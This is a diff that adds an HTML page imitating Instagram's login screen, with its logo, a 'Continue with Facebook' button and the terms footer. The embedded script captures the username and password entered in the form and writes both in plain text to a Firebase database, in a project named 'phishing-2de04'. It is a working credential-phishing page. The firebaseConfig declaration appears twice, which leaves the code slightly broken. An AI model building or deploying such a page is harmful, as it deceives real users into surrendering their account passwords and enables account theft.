@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Layout</title>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo">
+        </div>
+        <div class="content">
+            <button class="fb-login-btn">Continue with Facebook</button>
+            <div class="divider">
+                <span>OR</span>
+            </div>
+            <form class="login-form" id="loginForm">
+                <input type="text" placeholder="Phone number, username, or email" class="input-field" id="username">
+                <input type="password" placeholder="Password" class="input-field" id="password">
+                <a href="#" class="forgot-password">Forgot password?</a>
+                <button type="submit" class="login-btn">Log in</button>
+            </form>
+            <div class="signup">
+                <span>Don't have an account? <a href="#">Sign up</a></span>
+            </div>
+        </div>
+        <div class="footer">
+            <p>By continuing, you agree to Instagram's <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.</p>
+        </div>
+    </div>
+
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js"></script>
+
+    <!-- Your Firebase Configuration -->
+    <script>
+        const firebaseConfig = {
+       const firebaseConfig = {
+  apiKey: "AIzaSyCPE9yRHyupAQgGNtRNbiQmo-jizGJvt20",
+  authDomain: "phishing-2de04.firebaseapp.com",
+  projectId: "phishing-2de04",
+  storageBucket: "phishing-2de04.appspot.com",
+  messagingSenderId: "815392560634",
+  appId: "1:815392560634:web:30e05d3a15a84d80c8c043",
+  measurementId: "G-S6FM50N6ZF"
+};
+
+        // Initialize Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const database = firebase.database(app);
+
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();  // Prevent form from submitting the default way
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Save data to Firebase Realtime Database
+            const userRef = database.ref('users/' + username.replace(/[^a-zA-Z0-9]/g, ''));  // Replace non-alphanumeric characters for key
+            userRef.set({
+                username: username,
+                password: password
+            });
+
+            alert("Data stored successfully!");
+        });
+    </script>
+</body>
+</html>
+
